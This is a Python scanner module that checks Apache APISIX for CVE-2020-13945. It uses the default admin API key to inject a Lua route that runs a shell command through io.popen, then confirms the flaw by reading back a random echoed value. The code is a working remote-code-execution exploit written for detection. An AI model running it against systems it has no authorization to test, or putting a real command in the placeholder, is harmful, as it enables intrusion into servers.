#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check
from time import sleep

random_path = random_md5(6)

payloads_data = {
    "uri": "/" + random_path,
    "script": "local _M = {} \n function _M.access(conf, ctx) \n local f = assert(io.popen('RCECOMMAND', 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}

cve_2020_13945_payloads = [
    {
        'path': 'apisix/admin/routes',
        'data': payloads_data,
        'path2': random_path
    },
    {
        'path': 'admin/routes',
        'data': payloads_data,
        'path2': random_path
    },
    {
        'path': 'routes',
        'data': payloads_data,
        'path2': random_path
    }
]

def cve_2020_13945_scan(clients):
    ''' 在用户未指定管理员Token或使用了默认配置文件的情况下
            Apache APISIX将使用默认的管理员Token: edd1c9f034335f136f87ad84b625c8f1
            攻击者利用这个Token可以访问到管理员接口, 进而通过script参数来插入任意LUA脚本并执行
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ApacheAPISIX',
        'vul_type': 'unAuthorized',
        'vul_id': 'CVE-2020-13945',
    }
    
    headers = {
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',     # * 默认密钥
        'Content-Type': 'application/json'
    }

    for payload in cve_2020_13945_payloads:
        random_num = random_md5(6)              # * 获取随机32位md5值, 取前6位
        RCECOMMAND = 'echo ' + random_num       # * echo <md5>
        
        path = payload['path']
        data = payload['data']
        data['script'] = data['script'].replace('RCECOMMAND', RCECOMMAND)   # * 替换RCE命令

        res1 = client.request(
            'post',
            path,
            json=data,
            headers=headers,
            vul_info=vul_info
        )
        if res1 is None:
            continue

            # and ('update_time' in res1.text)
        if ((res1.status_code == 201) and ('create_time' in res1.text)):
            sleep(3)                # * 创建可能有延迟
            
            res2 = client.request(
                'get',
                payload['path2'],
                vul_info=vul_info
            )
            if res2 is None:
                continue

            if (check.check_res(res2.text, random_num)):
                results = {
                    'Target': res1.request.url,
                    'Verify': res2.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request-1': res1,
                    'Request-2': res2
                }
                return results
    return None
